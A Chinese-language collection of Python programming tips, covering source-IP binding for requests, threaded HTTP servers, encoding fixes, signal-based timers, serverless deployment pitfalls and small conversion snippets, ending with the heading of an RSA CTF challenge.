\"\"\" \u521b\u9020\u4e00\u4e2awrapper\u51fd\u6570\uff0c\u52ab\u6301oldfunc\u4f20\u5165\u7684\u7b2cparameter_index\u540d\u4e3aparameter_name\u7684\u51fd\u6570\uff0c\u56fa\u5b9a\u5176\u503c\u4e3aparameter_value; \u4e0d\u5f71\u54cd\u8c03\u7528\u8be5\u51fd\u6570\u65f6\u4f20\u5165\u7684\u4efb\u4f55\u5176\u4ed6\u53c2\u6570 \u7528\u6cd5\uff1a \u539f\u51fd\u6570 = function_hook_parameter(\u539f\u51fd\u6570, \u4ece1\u5f00\u59cb\u8ba1\u6570\u7684\u53c2\u6570\u6240\u5904\u7684\u4f4d\u7f6e, \u8fd9\u4e2a\u53c2\u6570\u7684\u540d\u79f0, \u9700\u8981\u66ff\u6362\u6210\u7684\u53c2\u6570\u503c) \u4f8b\u5b50\uff1a \u9700\u8981\u52ab\u6301socket.create_connection\u8fd9\u4e2a\u51fd\u6570\uff0c\u5176\u51fd\u6570\u539f\u578b\u5982\u4e0b\uff1a create_connection(address, timeout=_GLOBAL_DEFAULT_TIMEOUT, source_address=None) \u9700\u8981\u5bf9\u5176\u7b2c3\u4e2a\u53c2\u6570source_address\u56fa\u5b9a\u4e3avalue\uff0c\u52ab\u6301\u65b9\u6cd5\u5982\u4e0b socket.create_connection = function_hook_parameter(socket.create_connection, 3, \"source_address\", value) \"\"\" real_func = oldfunc def newfunc ( * args , ** kwargs ): # args\u662f\u53c2\u6570\u5217\u8868list\uff0ckwargs\u662f\u5e26\u6709\u540d\u79f0keyword\u7684\u53c2\u6570dict newargs = list ( args ) if len ( args ) >= parameter_index : # \u5982\u679c\u8fd9\u4e2a\u53c2\u6570\u88ab\u76f4\u63a5\u4f20\u5165\uff0c\u90a3\u4e48\u80af\u5b9a\u5176\u524d\u9762\u7684\u53c2\u6570\u90fd\u662f\u65e0\u540d\u79f0\u7684\u53c2\u6570\uff0cargs\u7684\u957f\u5ea6\u80af\u5b9a\u957f\u4e8e\u5176\u6240\u5728\u7684\u4f4d\u7f6e newargs [ parameter_index - 1 ] = parameter_value # \u7b2c3\u4e2a\u53c2\u6570\u5728list\u7684\u4e0b\u6807\u662f2 else : # \u5982\u679c\u4e0d\u662f\u76f4\u63a5\u4f20\u5165\uff0c\u90a3\u4e48\u5c31\u5728kwargs\u4e2d \u6216\u8005\u4f20\u5165\u7684\u53ef\u9009\u53c2\u6570\u4e2d\u6ca1\u6709\u8fd9\u4e2a\u53c2\u6570\uff0c\u76f4\u63a5\u8bbe\u7f6ekwargs\u5373\u53ef kwargs [ parameter_name ] = parameter_value return real_func ( * newargs , ** kwargs ) return newfunc myip = \"x.x.x.x\" #\u4f60\u9700\u8981\u4f7f\u7528\u7684IP\uff0c\u9700\u8981\u64cd\u4f5c\u7cfb\u7edf\u5df2\u7ecf\u53d6\u5f97\u8fd9\u4e2aIP import socket socket . create_connection = function_hook_parameter ( socket . create_connection , 3 , \"source_address\" , ( myip , 0 )) import requests bakup_create_connection = requests . packages . urllib3 . util . connection . create_connection #\u5907\u4efd\u4e00\u4efd\u4ee5\u5907\u540e\u7eed\u7ee7\u7eed\u66ff\u6362 requests . packages . urllib3 . util . connection . create_connection = function_hook_parameter ( requests . packages . urllib3 . util . connection . create_connection , 3 , \"source_address\" , ( myip , 0 )) # \u9a8c\u8bc1\u662f\u5426\u6210\u529f\u4fee\u6539\u6e90IP print ( requests . get ( \"http://ip.cn\" ) . text ) #\u8bbf\u95ee\u7f51\u7ad9\u67e5\u770b\u5f53\u524d\u4f7f\u7528\u7684\u516c\u7f51IP\uff0c\u5982\u679c\u5185\u7f51\u4f60\u53ef\u4ee5\u81ea\u884c\u642d\u5efa\u670d\u52a1\u5668\u67e5\u770b\u8bbf\u95ee\u65e5\u5fd7\u4ece\u800c\u786e\u5b9aIP # \u5982\u679c\u540e\u7eed\u8fd8\u8981\u8fdb\u884c\u66ff\u6362\uff0c\u5219\u5e94\u8be5\u4f20\u5165bakup_create_connection mynewip = \"x.x.x.y\" #\u53e6\u5916\u4e00\u4e2a\u5f53\u524d\u64cd\u4f5c\u7cfb\u7edf\u5df2\u7ecf\u53d6\u5f97\u7684IP requests . packages . urllib3 . util . connection . create_connection = function_hook_parameter ( bakup_create_connection , 3 , \"source_address\" , ( mynewip , 0 )) Python\u591a\u7ebf\u7a0b\u6a21\u677f \u00b6 \u4f7f\u7528threading\u6a21\u5757\u8fdb\u884c\u5f00\u53d1 MultiThread_Template.py http.server\uff08BaseHTTPServer\uff09\u5e76\u53d1\u6027\u6539\u5584 \u00b6 New version \u4e0d\u5fc5\u4fee\u6539\u5e93\u4ee3\u7801 \u00b6 \u5728\u4f7f\u7528BaseHTTPServer.HTTPServer\u7684\u65f6\u5019\uff0c\u5bf9\u5176\u4f7f\u7528\u7684\u7236\u7c7b\u4fee\u6539\u521b\u9020\u81ea\u5df1\u7684\u7c7b\uff0c\u53c2\u8003 How to dynamically change base class of instances at runtime? import BaseHTTPServer # \u5982\u679cpy3\uff0c\u9700\u8981import http.server as BaseHTTPServer import socketserver MyHTTPServer = type ( 'MyHTTPServer' , ( socketserver . ThreadingTCPServer ,), dict ( BaseHTTPServer . HTTPServer . __dict__ )) def MyHandler ( BaseHTTPServer . BaseHTTPRequestHandler ): pass # \u7701\u7565handler\u7684\u4ee3\u7801\uff0c\u4e00\u4e9bdo_GET\uff0cdo_POST\u7684\u51fd\u6570 httpd = MyHTTPServer ( ( '0.0.0.0' , 80 ), MyHandler ) httpd . serve_forever () \u600e\u4e48\u77e5\u9053MyHTTPServer\u7684\u7236\u7c7b\u786e\u5b9e\u88ab\u4fee\u6539\u4e86\u5462\uff1f \u53ef\u4ee5\u67e5\u770b\u5176__mro__\u5c5e\u6027\uff08Method Resolution Order attribute\uff09 Old version \u4fee\u6539\u5e93\u4ee3\u7801(\u4e0d\u5efa\u8bae) \u00b6 \u53c2\u8003\u8d44\u6599\uff1a \u5229\u7528Python\u4e2dSocketServer \u5b9e\u73b0\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u5668\u95f4\u975e\u963b\u585e\u901a\u4fe1 \u76f4\u63a5\u4fee\u6539BaseHTTPServer\u7684\u4ee3\u7801\u4e2d\u7684\u4e00\u4e2a\u7ec6\u8282\uff0c\u5c06BaseHTTPServer\u7c7b\u7ee7\u627f\u7684\u539f\u5148\u53ea\u80fd\u652f\u6301\u5355\u4e2a\u8bf7\u6c42\u7684SocketServer.TCPServer\u6539\u4e3a\u6bcf\u4e2a\u8fde\u63a5\u4e00\u4e2a\u7ebf\u7a0b\u7684SocketServer.ThreadingTCPServer\uff0c\u4f7fBaseHTTPServer\u80fd\u652f\u6301\u5e76\u53d1\u800c\u4e0d\u662f\u4e00\u6b21\u53ea\u80fd\u5904\u7406\u5355\u4e2a\u8bf7\u6c42 Python3\u7684\u65b9\u6cd5 \uff1a \u5728Python3\u4e2dBaseHTTPServer\u6539\u540d\u4e3ahttp.server\u4e86\uff0c\u9996\u5148\u627e\u5230http.server\u6240\u5728\u7684py\u6587\u4ef6\uff1a python3 - c \"import http.server; print(http.server)\" \u4fee\u6539\u5176\u63d0\u793a\u7684\u6587\u4ef6\uff0c\u4f8b\u5982\u6211\u8fd9\u91cc\u662f /usr/lib/python3.4/http/server.py \u641c\u7d22 class HTTPServer \uff0c\u5982\u679c\u662f\u7528vim\u53ef\u4ee5\u7528 /class HTTPServer \u4fee\u6539\u627e\u5230\u7684\u8fd9\u4e00\u884c\uff0c\u6539\u4e3a\uff1a class HTTPServer ( socketserver . ThreadingTCPServer ): Python2\u7684\u65b9\u6cd5 \uff1a \u9996\u5148\u627e\u5230BaseHTTPServer\u5728\u54ea\uff1a python - c \"import BaseHTTPServer; print(BaseHTTPServer)\" \u4fee\u6539\u5bf9\u5e94\u7684\u6587\u4ef6\uff0c\u5982/usr/lib/python2.7/BaseHTTPServer.py\uff0c\u6ce8\u610f\u4e0d\u8981\u6253\u5f00\u4ed6\u76f4\u63a5\u63d0\u793a\u7684pyc\u6587\u4ef6\u800c\u662f\u8981\u5bf9\u5e94\u7684\u540c\u540dpy\u6587\u4ef6 \u627e\u5230\u8fd9\u884c\uff08vim\u4e2d\u53ef\u4ee5\u8f93\u5165 /class HTTPServer \u8fdb\u884c\u641c\u7d22\uff09\uff1a class HTTPServer ( SocketServer . TCPServer ): \u4fee\u6539\u5176\u7ee7\u627f\u7684\u7236\u7c7b\uff1a class HTTPServer ( SocketServer . ThreadingTCPServer ): \u65e0root\u6743\u9650\u5b89\u88c5Python \u00b6 \u4e0b\u8f7d\u6700\u65b0\u7248python\u6e90\u7801\u540e\u6307\u5b9aprefix\u7f16\u8bd1\uff0c\u5047\u8bbe\u7528\u6237\u76ee\u5f55\u4e3a/home/chenyuan apt - get install libssl - dev openssl curl - O https :// www . python . org / ftp / python / 3.5.2 / Python - 3.5.2 . tgz tar - xzf Python - 3.5.2 . tgz cd Python - 3.5.2 / . / configure -- prefix =/ home / chenyuan / python3 make make install >/ dev / null pushd / home / chenyuan / python3 / bin cp python3 python cp pip3 pip alias python3 = `pwd` / python alias pip3 = `pwd` / pip \u4e2d\u6587\u8f93\u51fa\u4e71\u7801\u95ee\u9898 \u00b6 \u65b9\u6cd51\uff1a\u8fd0\u884cpy\u524d\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf export PYTHONIOENCODING = utf8 \u65b9\u6cd52\uff1a\u5f3a\u5236\u4fee\u6539stdout import sys sys . stdout = open ( 1 , 'w' , encoding = 'utf-8' , closefd = False ) \u9075\u5faaPEP8\u68c0\u67e5\u4f60\u7684\u4ee3\u7801 \u00b6 pycodestyle \u5b89\u88c5\u5e76\u4f7f\u7528pycodestyle\u68c0\u67e5\u4ee3\u7801\uff0c\u5ffd\u7565E501\u4e00\u884c\u4e0d\u80fd\u957f\u4e8e80\u4e2a\u5b57\u7b26\u7684\u9650\u5236\uff1a pip install pycodestyle pycodestyle --show-source --ignore=E501 yourcode.py \u751f\u6210\u968f\u673a\u5b57\u7b26\u4e32 \u00b6 import random import string def random_str ( length = 8 ): return \"\" . join ( random . sample ( string . ascii_letters , length )) from random import Random def random_str ( randomlength = 8 ): str = '' chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789' length = len ( chars ) - 1 random = Random () for i in range ( randomlength ): str += chars [ random . randint ( 0 , length )] return str Python\u89e3\u65b9\u7a0b \u00b6 \u9700\u8981 pip install sympy from sympy import * # \u89e3\u4e00\u5143\u65b9\u7a0b\uff1a # 2x^2-18=0 x = Symbol ( 'x' ) print ( solve ( 2 * x ** 2 - 18 , x )) # \u5f97\u5230[-3,3] # \u89e3\u65b9\u7a0b\u7ec4 # y=1-x # 3x+2y-5 x , y = symbols ( 'x y' ) print ( solve ([ y - 1 + x , 3 * x + 2 * y - 5 ], [ x , y ])) # \u5f97\u5230{x: 3, y: -2} \u5927\u6570\u636e\u5224\u65adin \u00b6 \u4e00\u5b9a\u8981\u7528set\uff0c\u56e0\u4e3aset\u7684in\u64cd\u4f5c\u662fO(1)\u7684\uff0c\u7528list\u662fO(n)\u901f\u5ea6\u592a\u6162 \u89e3\u51b3Python.h: No such file or directory \u00b6 apt-get install -y python-dev python3-dev \u5982\u679c\u4e3aCentOS\u7cfb\u7edf\uff1a yum install python-devel \u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\u8f6c\u666e\u901a\u5b57\u7b26\u4e32 \u00b6 \u65b9\u6cd5\u4e00\uff1a\u5c06\u5b57\u7b26\u4e32\u6bcf8\u4e2a\u5206\u6210\u4e00\u7ec4\uff0c\u7528int\u8f6c10\u8fdb\u5236\uff0c\u518d\u7528chr\u8f6c\u4e3aascii\u5b57\u7b26 s=\"0110001101111001\" ans=\"\" for i in range(0,len(s)//8): x = s[i*8:i*8+8] ans+=chr(int(x,2)) \u65b9\u6cd5\u4e8c\uff1a\u5229\u7528binascii\uff0c\u5148\u7528int\u8f6c\u4e3a10\u8fdb\u5236\uff0c\u7136\u540e\u8f6c\u4e3a16\u8fdb\u5236\u5b57\u7b26\u4e32\uff0c\u8c03\u7528unhexlify\u6267\u884c\u7ffb\u8bd1 import binascii s = \"0110001101111001\" ans = binascii . unhexlify ( ' %x ' % int ( s , 2 )) . decode () \u8865\u5145\uff1a\u76f8\u5e94\u7684\u5982\u679c\u8981\u628a\u5341\u8fdb\u5236\u8f6c\u4e3a\u4e8c\u8fdb\u5236\uff0c\u53ef\u4ee5\u7528bin(123)[2:] \u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u8f6cbytes\u5b57\u7b26\u4e32 \u00b6 from base64 import b16encode , b16decode print ( b16encode ( b 'py3.io' ) . decode () ) #output: 7079332E696F print ( b16decode ( \"7079332E696F\" . upper ()) ) #output: b'py3.io', \u8fd9\u91cc\u4f7f\u7528upper\u8f6c\u5927\u5199 \u76f8\u5e94\u7684\uff0c\u62ff\u5230\u4e00\u4e2a\u5341\u8fdb\u5236\u6570\uff0c\u8f6c\u5b57\u7b26\u4e32\uff1a key = 5287002131074331513 print( b16decode( hex(key)[2:].upper() ) )#output: b'I_4m-k3y' \u7528Python3\u5199PAT\u5fc3\u5f97 \u00b6 \u5982\u679c\u53d1\u751f\u683c\u5f0f\u9519\u8bef\uff0c\u68c0\u67e5\u8f93\u51fa\u7684\u6700\u540e\u4e00\u884c\u7684print\uff0c\u52a0\u4e0aend=\u201d\u201c\u8868\u793a\u4e0d\u8981\u6362\u884c \u5982\u679c\u6570\u636e\u89c4\u6a21\u5927\u5bfc\u81f4\u8d85\u65f6\uff0c\u4ee3\u7801\u4e2d\u7684in\u64cd\u4f5c\u524d\u5148\u628alist\u8f6c\u4e3aset\uff0c\u80fd\u5927\u5e45\u5ea6\u63d0\u901f \u7528requests\u8fdb\u884cpost \u00b6 \u9700\u8981\u6ce8\u610f\u52a0\u4e0a\u8fd9\u4e24\u4e2a\u53c2\u6570\uff1a ,allow_redirects=False,headers={\"Content-Type\": \"application/x-www-form-urlencoded\"} \u767b\u5f55\u8bf7\u6c42\u7684\u65f6\u5019\u662f\u8981\u6839\u636e\u8fd4\u56de\u7684headers\u91cc\u9762Location\u6709\u6ca1\u6709\u5bf9\u4e0d\u5bf9\u6765\u5224\u65ad\u767b\u5f55\u662f\u5426\u6210\u529f\u7684\uff0c\u800crequests\u9ed8\u8ba4\u4f1a\u8ddf\u968f301/302\u8df3\u8f6c\uff0c\u5bfc\u81f4\u65e0\u6cd5\u83b7\u53d6\u5230\u8df3\u8f6c\u8bf7\u6c42\u7684headers\uff0c\u6240\u4ee5\u52a0\u4e0a allow_redirects=False \u53e6\u5916\u5c31\u662fpost\u6570\u636e\u7684\u65f6\u5019\u5fc5\u987b\u7ed9\u51fa\u6b63\u786e\u7684Content-Type\uff0c\u5426\u5219\u670d\u52a1\u5668\u4e0d\u8ba4\u8fd9\u4e2apost\u7684 \u518d\u8005\u5c31\u662f\u53ef\u80fd\u5bf9\u65b9\u6709\u53cd\u722c\u866b\u63aa\u65bd\uff0c\u52a0\u4e0aReferer\u548cUser-Agent\u5c31\u597d\u54af \u5982\u679c\u9700\u8981\u63d0\u4ea4\u7684\u662fjson\u7684\u6570\u636e\uff0c\u8bb0\u5f97post\u7684data\u7684\u5355\u53cc\u5f15\u53f7\u8981\u6b63\u786e\uff0c\u5e94\u8be5\u7528json.dumps\u7684\u7ed3\u679c\u53bbpost \u5982\u679c\u8981\u505a\u722c\u866b\uff0c\u6b22\u8fce\u4f7f\u7528\u6211\u7684 EasyLogin \uff0c\u65e0\u9700\u518d\u64cd\u5fc3\u8fd9\u4e9b\u7ec6\u8282\uff0c\u4e13\u6ce8\u4e8e\u6838\u5fc3\u722c\u866b\u4ee3\u7801 \u901a\u8fc7tkinter\u83b7\u53d6\u3001\u4fee\u6539\u526a\u8d34\u677f \u00b6 \u652f\u6301py2\u548cpy3\uff0cLearned from https://www.daniweb.com/programming/software-development/code/487653/access-the-clipboard-via-tkinter try : from tkinter import Tk except ImportError : from Tkinter import Tk root = Tk () root . withdraw () #\u9690\u85cfTk\u7684\u7a97\u53e3 text = \"Donnerwetter\" # \u6e05\u7a7a\u526a\u8d34\u677f clear clipboard root . clipboard_clear () # \u5199\u5165\u526a\u8d34\u677f write text to clipboard root . clipboard_append ( text ) # \u8bfb\u53d6\u526a\u8d34\u677f text from clipboard clip_text = root . clipboard_get () print ( clip_text ) # --> Donnerwetter \u7b26\u53f7\u6570\u4e0e\u65e0\u7b26\u53f7\u6570\u8f6c\u6362 \u00b6 \u65e0\u7b26\u53f7\u2192\u6709\u7b26\u53f7\uff0c\u4e3a\u4e86\u52a0\u4e0a\u8d1f\u53f7\uff1a \u00b6 import ctypes ctypes . c_int64 ( 17039472050328044269 ) . value \u4e0a\u8ff0\u5c06\u5f97\u5230-1407272023381507347 \u6709\u7b26\u53f7\u2192\u65e0\u7b26\u53f7\uff0c\u4e3a\u4e86\u53bb\u6389\u8d1f\u53f7\uff1a \u00b6 import ctypes ctypes . c_uint64 ( - 1407272023381507347 ) . value \u4e0a\u8ff0\u5c06\u5f97\u523017039472050328044269 \u4f7f\u7528signal.SIGALRM\u5728\u9650\u5b9a\u65f6\u95f4\u540e\u9000\u51fa\u8fdb\u7a0b (only Linux) \u00b6 \u5728\u8bbe\u8ba1CTF\u7684\u9898\u76ee\u7684\u65f6\u5019\uff0c\u6709\u5fc5\u8981\u9650\u5236\u7528\u6237\u7684\u8fde\u63a5\u65f6\u95f4\uff0c\u8fd9\u65f6\u5019\u7b80\u5355\u65b9\u6848\u5c31\u662f\u7528SIGALRM\u4fe1\u53f7\u54af def clock ( timeout = 5 ): import signal def signal_handler ( signum , data ): if signum == signal . SIGALRM : print ( \"Time is up!\" ) exit () signal . signal ( signal . SIGALRM , signal_handler ) signal . alarm ( int ( timeout )) \u6355\u6349\u7528\u6237\u7684Ctrl+C \u00b6 \u7279\u6b8a\u60c5\u51b5\u4e0b\u6211\u4eec\u60f3\u5c4f\u853d\u6389Ctrl+C\uff0c\u8fd9\u65f6\u5019\u5199\u4e2a\u81ea\u5df1\u7684\u51fd\u6570\u5904\u7406SIGALRM\u4fe1\u53f7\u5c31\u597d\u5566 import signal def signal_handler ( signum , data ): if signum == signal . SIGINT : print ( \"Ctrl+C is pressed!\" ) #raise KeyboardInterrupt if __name__ == '__main__' : signal . signal ( signal . SIGINT , signal_handler ) sleep ( 666 ) \u4f7f\u7528signal.SIGALRM\u5b9e\u73b0\u5b9a\u65f6\u5668 (only Linux) \u00b6 \u5b9e\u73b0\u4e00\u4e2a\u7c7b\u4f3cJavascript\u7684setInterval\u529f\u80fd import signal from time import sleep INTERVAL = 1 COUNT = 0 def signal_handler ( signum , data ): global COUNT if signum == signal . SIGALRM : # \u4f60\u7684\u5b9a\u65f6\u5668\u4ee3\u7801\u5199\u5728\u8fd9\u91cc Your function here print ( \"Count! {}\" . format ( COUNT )) COUNT += 1 signal . alarm ( int ( INTERVAL )) #\u518d\u8bbe\u7f6e\u4e00\u4e2aclock\u5c31\u80fd\u5faa\u73af\u5f80\u590d\u54af if __name__ == '__main__' : signal . signal ( signal . SIGALRM , signal_handler ) signal . alarm ( int ( INTERVAL )) sleep ( 23333 ) \u4f7f\u7528pdb\u8fdb\u884c\u8c03\u8bd5 \u00b6 \u5728\u9700\u8981\u8c03\u8bd5\u7684\u6587\u4ef6\u5934\u90e8\u52a0\u5165 import pdb \u9700\u8981\u505c\u4e0b\u6765\u7684\u5730\u65b9\u52a0\u5165 pdb.set_trace() Tutorial: https://github.com/spiside/pdb-tutorial \u4f7f\u7528Python\u5f00\u53d1Serverless(Function as Service)\u540e\u7aef\u670d\u52a1 \u00b6 \u9879\u76ee\u5730\u5740 & \u90e8\u7f72\u8fc7\u7a0b \u5982\u679c\u60a8\u53ea\u662f\u9700\u8981\u90e8\u7f72\u4e00\u4e2aExample\uff0c\u2191\u2191\u2191(\u987a\u624b\u6c42\u4e2aStar)\uff1b\u5982\u679c\u60a8\u5bf9\u8fd9\u4e2a\u4ee3\u7801\u662f\u5982\u4f55\u5199\u51fa\u6765\u7684\u548c\u8e29\u5751\u8fc7\u7a0b\u611f\u5174\u8da3\uff0c\u7ee7\u7eed\u770b\u5427\uff1a \u8e29\u8fc7\u7684\u5751\u4e0e\u89e3\u51b3\u8fc7\u7a0b(\u8bba\u963f\u91cc\u4e91\u662f\u600e\u4e48\u628a\u4eba\u6c14\u6b7b\u7684) \u00b6 1.API\u7f51\u5173\u4e0e\u51fd\u6570\u8ba1\u7b97\u7684\u5bf9\u63a5 \u00b6 \u6309\u7167 \u6559\u7a0b \uff0c\u5f53\u65f6\u4e0d\u591f\u8010\u5fc3\uff0c\u62ff\u7740hello world\u7684\u7a0b\u5e8f\uff08\u4e0d\u8981\u4fe1\u6559\u7a0b\u4e2d\u76842.1\u90e8\u5206\u7684\u622a\u56fe\uff09\u5c31\u5728\u4f7f\u7528API\u7f51\u5173\uff0c\u7ed3\u679c\u603b\u662f\u8fd4\u56de503 \u8010\u5fc3\u4e0b\u6765\u770b\u6587\u6863\u628a\u7a0b\u5e8f\u6539\u4e3a\u540e\u9762\u7684\u649e\u5899\u5f0f\u7a0b\u5e8f\u5c31\u597d\u4e86\uff0c\u4eba\u5bb6\u5176\u5b9e\u8bf4\u4e86\u51fd\u6570\u8ba1\u7b97\u5e94\u8be5\u8fd4\u56de\u7684\u6570\u636e\u7ed3\u6784\uff0c\u4e0d\u6309\u7167\u8fd9\u4e2a\u7ed3\u6784\u6765\u5c31\u4f1a503\uff1a { \"isBase64Encoded\": True\u6216\u8005False, \"statusCode\": 200, #\u53ef\u4ee5\u4e3a302\u6765\u5b9e\u73b0\u8df3\u8f6c \"headers\": {...} #\u8fd4\u56de\u7684response headers\uff0c\u4f46\u5176\u4e2d\u7684Content-Type\u6ca1\u6709\u4f5c\u7528 \"body\": \"...\" #\u8fd4\u56de\u7684\u7f51\u9875\u6b63\u6587\u5185\u5bb9 } 2.\u4fee\u6539API\u7f51\u5173\u53c2\u6570\u5b9a\u4e49\u540e\u8981\u518d\u6b21\u53d1\u5e03 \u00b6 \u65e0\u8bba\u6709\u6ca1\u6709\u6539Mock\u8bbe\u7f6e\uff0c\u53ea\u8981\u6539\u52a8\u4e86\u8bbe\u7f6e\u90fd\u9700\u8981\u91cd\u65b0\u53d1\u5e03\uff0c\u53d1\u5e03\u7ebf\u4e0a\u7248\u672c\u5373\u53ef 3.\u4e0d\u80fd\u4f7f\u7528Windows\u7248\u672c\u7684fcli\u5de5\u5177(fcli.exe) \u00b6 \u4eba\u5bb6\u5df2\u7ecf\u53d1\u5e03\u4e86\u65b0\u7248\u672c\u7684fcli\u89e3\u51b3\u4e86\u6b64\u95ee\u9898 \u8fd9\u4e2abug\u7b80\u76f4\u4e86\uff0c\u6574\u4e2a\u6d41\u7a0b\u5982\u4e0b\uff1a \u6309\u7167\u6587\u6863\u8bf4\u660e\u4e00\u8def\u90e8\u7f72\u4e0a\u4f20\u90fd\u6ca1\u6709\u95ee\u9898\uff0c\u8c03\u7528\u51fd\u6570\u7684\u65f6\u5019\u5374\u8bf4 Unable to import module 'index' \u7136\u540e\u6211\u5c31\u5728Linux\u670d\u52a1\u5668\u4e0a docker pull python:2.7 \u7136\u540e docker run -it --rm -v /root/ical:/code python:2.7 /bin/bash \uff0c\u8fdb\u5165bash\u540e cd /code; python \uff0c\u8fdb\u5165python\u540e import index` \u554a\u54c8\uff0c\u53d1\u73b0\u662f ImportError: No module named 'bs4' \uff0c\u81ea\u5df1\u7684\u9505\uff0c\u7528 pip install bs4 -t . \u4e00\u4e2a\u4e2a\u89e3\u51b3\u4f9d\u8d56\u5305\u540e\uff0c\u5728docker\u5bb9\u5668\u4e2d\u603b\u7b97\u662f\u80fd\u591f\u8dd1\u8d77\u6765\u4e86\uff0c\u4e14\u80fd\u6b63\u5e38\u8fd4\u56de\u4e86 \u7136\u540e\u7528 fcli.exe shell \u7684 mkf \u518d\u4e0a\u4f20\u4e00\u6b21\uff0c\u8c03\u7528\u51fd\u6570\u8fd8\u662f\u8001\u6837\u5b50 Unable to import module 'index' \uff0c\u4ee4\u4eba\u5f88\u6293\u72c2\u3002\u3002\u3002 \u7a81\u7136\u60f3\u5230\u4e0d\u80fd\u88abimport\u5e94\u8be5\u662f\u5168\u5c40\u7684import\u5931\u8d25\u4e86\uff0c\u591a\u6b21\u6298\u817e\u540e\uff0c\u628a from grabber import grabber \u79fb\u52a8\u5230index\u51fd\u6570\u4e2d\uff0c\u603b\u7b97\u5f97\u5230\u4e86\u660e\u786e\u7684\u62a5\u9519\uff1a\u8fd8\u662f ImportError: No module named 'bs4' \uff1b\u54c8\uff1f\u8fd9\u662f\u4ec0\u4e48\u9b3c\uff0c\u660e\u660e\u6211\u90fd\u628abs4\u6587\u4ef6\u5939\u653e\u5230\u4ee3\u7801\u76ee\u5f55\u4e0b\u4e86\uff0c\u4e3a\u5565\u8fd8\u662f\u62a5\u9519\uff1f \u65e2\u7136\u4ed6\u8bf4import\u5931\u8d25\uff0c\u4f1a\u4e0d\u4f1a\u662fPython\u641c\u7d22\u5305\u7684PATH\u7684\u95ee\u9898\uff0c\u4e8e\u662fGoogle\u5230\u4e86\u628a\u5f53\u524d\u6587\u4ef6\u6240\u5728\u7684\u76ee\u5f55\u52a0\u5165\u641c\u7d22\u7684\u65b9\u6cd5\uff1a sys.path.append(os.path.dirname(os.path.abspath(__file__))) Orz, \u8fd8\u662f\u6ca1\u6709\u7528\u3002\u3002\u3002 \u60f3\u5230\u65e2\u7136\u90e8\u7f72\u540e\u4ee3\u7801\u6587\u4ef6\u5939 /code \u6ca1\u6709\u6211\u9700\u8981\u7684\u4f9d\u8d56\u5305\uff0c\u90a3 /code \u6587\u4ef6\u5939\u91cc\u9762\u5230\u5e95\u6709\u5565\u5462\uff1f\u679c\u65adfuck\u4e00\u4e0b\uff0c\u5728index\u51fd\u6570\u5f00\u5934\u5199\u4e0a: def index (): return { \"fuck\" : list ( os . listdir ( \"/code\" ))} import bs4 #\u4f1a\u51fa\u9519\u7684import ... #\u6b63\u5e38\u4ee3\u7801 \u603b\u7b97\u8c03\u7528\u6210\u529f\u4e86\uff0c\u7136\u540e\u4e00\u770b\u8f93\u51fa\u7ed3\u679c\uff0cwoc! (\u5185\u5fc3\u4e2d\u9a82\u4e86\u591a\u6b21mdzz\u963f\u91cc\u4e91 \u7ed9\u5f20\u622a\u56fe\uff1a os.listdir\u5e94\u8be5\u8fd4\u56de\u7684\u662f\u5f53\u524d\u8fd9\u4e2a\u6587\u4ef6\u5939\u4e0b\u542b\u6709\u7684\u6587\u4ef6\u540d\u79f0\u548c\u6587\u4ef6\u5939\u540d\u79f0\uff0c\u800c\u73b0\u5728\u6211\u4eec\u770b\u5230\u7684\u662f\u542b\u6709 \\\\ \u5f88\u50cf\u8def\u5f84\u540d\u7684\u4e1c\u897f\uff0c\u8bf4\u660e\u8fd9\u4e2afcli.exe\u628awindows\u7684 \\\\ \u8def\u5f84\u540d\u5f53\u6210\u4e86\u6587\u4ef6\u540d\u7684\u4e00\u90e8\u5206\uff0c\u90e8\u7f72\u540e\u5728/code\u6587\u4ef6\u5939\u4e0b\u4e5f\u5c31\u5bf9\u5e94\u521b\u5efa\u4e86\u540d\u79f0\u4e3a bs4\\\\__init__.py \u8fd9\u6837\u7684\u6587\u4ef6(\u6839\u672c\u6ca1\u6709bs4\u5b50\u6587\u4ef6\u5939)\uff0cPython\u5f53\u7136\u4f1a\u627e\u4e0d\u5230bs4\u8fd9\u4e2a\u5305\u554a\uff01\u6454\uff01 \u6539\u7528\u4eba\u5bb6fcli\u7684Linux 64bit\u7248\u672c\uff0c\u95ee\u9898\u89e3\u51b3\u3002\u3002\u3002 \u603b\u7ed3\u4e00\u4e0b\uff0c\u4e07\u4e07\u60f3\u4e0d\u5230Windows\u7248\u672c\u7684\u5de5\u5177(\u9488\u5bf90.5\u7248\u672c)\u4f1a\u628a\u8def\u5f84\u5206\u9694\u7b26 \\\\ \u5f53\u6210\u6587\u4ef6\u540d\u4e00\u90e8\u5206\u6765\u770b\u5f85\uff0c\u771f\u662f\u5927\u5f00\u773c\u754c \u4fee\u590dLinux\u4e0bgbk\u7f16\u7801\u7684\u6587\u4ef6\u540d \u00b6 \u4ee3\u7801\u89c1 code/fixgbknames.py \u5728\u7279\u6b8a\u60c5\u51b5\u4e0b\uff0cLinux\u4e2d\u53ef\u80fd\u4f1a\u6709gbk\u7f16\u7801\u7684\u6587\u4ef6\u540d\uff0c\u8fd9\u79cd\u6587\u4ef6\u7528 ls \u67e5\u770b\u90fd\u662f\u4e71\u7801\uff0c\u96be\u4ee5\u64cd\u4f5c \u5982\u4f55\u4fee\u590d\u8fd9\u4e9b \u9519\u8bef \u7684\u6587\u4ef6\u540d\u5462\uff1f\u7528\u5230 python3 \u63d0\u4f9b\u7684os.walk(b\u201d.\u201d)\u5c31\u80fd\u5f97\u5230bytes\u7c7b\u578b\u7684\u6587\u4ef6\u540d\uff0c\u7136\u540e os.system \u8c03\u7528bytes\u7c7b\u578b\u7684 mv \u547d\u4ee4\u884c\u5c31\u597d\u5566~ Crack RSA! \u00b6 \u9898\u76ee\u4fe1\u606f \u00b6 \u9898\u76ee\u6765\u6e90\uff1a \u6e05\u534e\u84dd\u83b2\u82b1\u6218\u961f\u7eb3\u65b0\u8868\uff08\u9700\u81ea\u5907\u68af\u5b50\uff09 \u5bc6\u7801\u5b66 (Cryptography) RSA\u7b97\u6cd5\u7684\u539f\u7406\u4ee5\u53ca\u7834\u89e3\uff0c\u8bf7\u4e0b\u8f7d \u8fd9\u4e2a\u6587\u4ef6 